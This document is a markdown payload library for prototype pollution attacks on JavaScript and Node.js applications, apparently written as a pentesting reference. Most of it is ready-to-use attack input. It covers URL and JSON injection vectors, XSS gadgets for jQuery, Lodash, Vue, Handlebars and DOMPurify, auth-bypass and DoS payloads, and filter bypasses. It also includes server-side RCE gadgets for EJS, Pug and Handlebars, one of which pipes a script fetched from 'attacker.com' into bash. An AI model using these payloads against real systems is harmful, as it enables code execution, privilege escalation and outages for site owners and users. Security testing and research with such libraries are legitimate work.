---
id: "prototype-pollution-payloads"
title: "Prototype Pollution Payload Library"
type: "payload"
category: "web-application"
subcategory: "deserialization"
tags: ["prototype-pollution", "javascript", "nodejs", "__proto__", "constructor", "gadgets", "rce", "xss", "lodash", "jquery", "ejs", "deep-dig"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["prototype-pollution", "xss-advanced-techniques", "javascript-analysis"]
updated: "2026-04-14"
---

## Overview

Prototype pollution injects properties into Object.prototype, which propagate to all JavaScript objects. Client-side leads to XSS/DOM manipulation. Server-side leads to RCE, auth bypass, or DoS. Payloads target deep-merge operations (lodash.merge, jQuery.extend, custom merge functions) that recursively copy user-controlled objects.

## Core Injection Vectors

### __proto__ via URL parameters
```
?__proto__[polluted]=true
?__proto__.polluted=true
?__proto__[isAdmin]=true
?__proto__[role]=admin
?__proto__[verified]=true
?__proto__[constructor][prototype][polluted]=true
```

### constructor.prototype via URL parameters
```
?constructor[prototype][polluted]=true
?constructor.prototype.polluted=true
?constructor[prototype][isAdmin]=true
?constructor[prototype][role]=admin
```

### __proto__ via JSON body
```json
{"__proto__":{"polluted":true}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"verified":true}}
{"__proto__":{"debug":true}}
{"__proto__":{"status":"active"}}
```

### constructor via JSON body
```json
{"constructor":{"prototype":{"polluted":true}}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"constructor":{"prototype":{"role":"admin"}}}
```

### Nested object pollution
```json
{"a":{"__proto__":{"polluted":true}}}
{"user":{"__proto__":{"role":"admin"}}}
{"config":{"__proto__":{"debug":true}}}
{"settings":{"constructor":{"prototype":{"polluted":true}}}}
```

### Hash fragment injection (client-side)
```
#__proto__[polluted]=true
#constructor[prototype][polluted]=true
#__proto__[innerHTML]=<img/src/onerror=alert(1)>
```

## Client-Side XSS Gadgets

### Generic DOM property gadgets
```
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
?__proto__[outerHTML]=<img/src/onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[src]=javascript:alert(1)
?__proto__[href]=javascript:alert(1)
?__proto__[action]=javascript:alert(1)
?__proto__[formaction]=javascript:alert(1)
?__proto__[data]=javascript:alert(1)
?__proto__[onload]=alert(1)
?__proto__[onerror]=alert(1)
?__proto__[onfocus]=alert(1)
?__proto__[onclick]=alert(1)
?__proto__[value]=<script>alert(1)</script>
```

### jQuery gadgets (< 3.4.0)
```
?__proto__[div][0]=<img/src/onerror=alert(1)>
?__proto__[div][1]=<script>alert(1)</script>

// Via $.extend deep merge
$.extend(true, {}, JSON.parse('{"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}'))

// Via $.fn.extend
$.fn.extend(JSON.parse('{"__proto__":{"polluted":true}}'))
```

### Lodash gadgets (< 4.17.12)
```
// _.merge
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'))

// _.defaultsDeep
_.defaultsDeep({}, JSON.parse('{"__proto__":{"polluted":true}}'))

// _.template XSS gadget (< 4.17.21)
?__proto__[sourceURL]=x%5D%7D%3Balert(1)//
// Pollutes: sourceURL property used in template compilation
// Result: _.template('x') executes alert(1)

// _.set
_.set({}, '__proto__.polluted', true)
```

### Vue.js gadgets
```
?__proto__[v-bind:class]=alert(1)
?__proto__[attrs][onload]=alert(1)
```

### Handlebars gadgets
```
?__proto__[pendingContent]=<img/src/onerror=alert(1)>
?__proto__[type]=Program
?__proto__[body][0][type]=MustacheStatement
```

### Sanitizer bypass via pollution
```
// If DOMPurify or similar reads config from object properties:
?__proto__[ALLOWED_TAGS][0]=script
?__proto__[ALLOW_DATA_ATTR]=true
?__proto__[ADD_TAGS][0]=script
?__proto__[RETURN_DOM]=false
?__proto__[WHOLE_DOCUMENT]=true
```

## Server-Side RCE Gadgets

### EJS template engine (CVE-2022-29078)
```json
// outputFunctionName pollution -> RCE
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').execSync('id');var __tmp2"}}

// Alternative EJS gadgets
{"__proto__":{"client":true,"escapeFunction":"1;process.mainModule.require('child_process').execSync('id')"}}

// EJS settings pollution
{"__proto__":{"settings":{"view options":{"outputFunctionName":"_tmp;process.mainModule.require('child_process').execSync('curl attacker.com/shell|bash');var __tmp2"}}}}
```

### Pug (Jade) template engine
```json
{"__proto__":{"block":{"type":"Text","val":"x]};process.mainModule.require('child_process').execSync('id')//"}}}

// Via self property
{"__proto__":{"self":true,"line":"1;process.mainModule.require('child_process').execSync('id')"}}
```

### Handlebars template engine
```json
{"__proto__":{"main":"{{#with this as |obj|}}{{#with (obj.constructor.constructor 'return process.mainModule.require(`child_process`).execSync(`id`)')}}{{this}}{{/with}}{{/with}}"}}
```

### child_process via env/shell pollution
```json
// Pollute shell option for child_process.spawn/exec
{"__proto__":{"shell":"/bin/bash"}}
{"__proto__":{"shell":true}}

// Pollute env for NODE_OPTIONS
{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}

// NODE_OPTIONS with --import (Node 18.19+, 20.6+)
{"__proto__":{"env":{"NODE_OPTIONS":"--import=data:text/javascript,import('child_process').then(m=>m.execSync('id'))"}}}

// Pollute argv for spawned processes
{"__proto__":{"argv0":"node","execArgv":["--eval","require('child_process').execSync('id')"]}}
```

### Express/Connect middleware gadgets
```json
// Status code pollution
{"__proto__":{"status":500}}

// Content-Type pollution
{"__proto__":{"content-type":"text/html"}}

// View engine pollution
{"__proto__":{"view engine":"ejs"}}
{"__proto__":{"views":"./malicious_views"}}
```

## Auth Bypass Payloads

```json
// If code checks: if (user.role === 'admin')
{"__proto__":{"role":"admin"}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"admin":true}}
{"__proto__":{"is_admin":true}}
{"__proto__":{"verified":true}}
{"__proto__":{"email_verified":true}}
{"__proto__":{"is_staff":true}}
{"__proto__":{"permissions":["admin","write","read"]}}
{"__proto__":{"scope":"admin"}}
{"__proto__":{"level":99}}
{"__proto__":{"approved":true}}
{"__proto__":{"active":true}}
{"__proto__":{"banned":false}}
```

## DoS Payloads

```json
// Crash by polluting toString/valueOf
{"__proto__":{"toString":1}}
{"__proto__":{"valueOf":null}}
{"__proto__":{"hasOwnProperty":null}}

// Type confusion crash
{"__proto__":{"length":"not_a_number"}}
{"__proto__":{"constructor":null}}

// Infinite loop via circular reference in iteration
{"__proto__":{"0":"a","length":1}}
```

## Detection Payloads

### Client-side detection
```javascript
// In browser console after injecting ?__proto__[polluted]=true
if ({}.polluted === 'true') { console.log('PROTOTYPE POLLUTION CONFIRMED'); }
if (({}).polluted) { console.log('POLLUTED'); }

// Check multiple properties
['polluted', 'isAdmin', 'test123'].forEach(p => {
    if (({}).hasOwnProperty(p) || ({})[p]) console.log('Polluted: ' + p);
});
```

### Server-side detection (blind)
```json
// Status code change
{"__proto__":{"status":510}}

// Content-Type change (observable in response)
{"__proto__":{"content-type":"text/plain"}}

// JSON spaces change (response formatting changes)
{"__proto__":{"json spaces":"  "}}
```

### PortSwigger server-side detection technique
```json
// Step 1: Pollute json spaces (non-destructive)
{"__proto__":{"json spaces":"  "}}
// If response JSON becomes indented -> confirmed

// Step 2: Try status code
{"__proto__":{"status":555}}
// If response status changes -> confirmed

// Step 3: Try content-type
{"__proto__":{"content-type":"text/html"}}
// If Content-Type header changes -> confirmed
```

## Bypass Techniques

### When __proto__ is blocked
```json
{"constructor":{"prototype":{"polluted":true}}}
```

### When constructor is blocked
```json
{"__proto__":{"polluted":true}}
```

### Deep nesting
```json
{"a":{"b":{"c":{"__proto__":{"polluted":true}}}}}
```

### Unicode bypass
```json
{"\u005f\u005fproto\u005f\u005f":{"polluted":true}}
```

## Vulnerable Functions to Search For

```
# Any of these with user-controlled input = potential pollution source
merge, extend, assign, defaults, defaultsDeep,
clone, cloneDeep, deepCopy, deepMerge, deepExtend,
$.extend, _.merge, _.assign, _.defaults,
Object.assign (safe unless recursive),
JSON.parse (safe, but parsed result may be passed to merge)
```

## Tools

- **PPScan** -- Automated prototype pollution scanner
- **pp-finder** -- Find prototype pollution gadgets in JavaScript
- **Server-Side Prototype Pollution Scanner** -- Burp extension (PortSwigger)
- **Burp Suite** -- Manual testing with Repeater
- **ppmap** -- Client-side prototype pollution scanner
- **cdnjs** -- Check library versions for known vulnerable gadgets
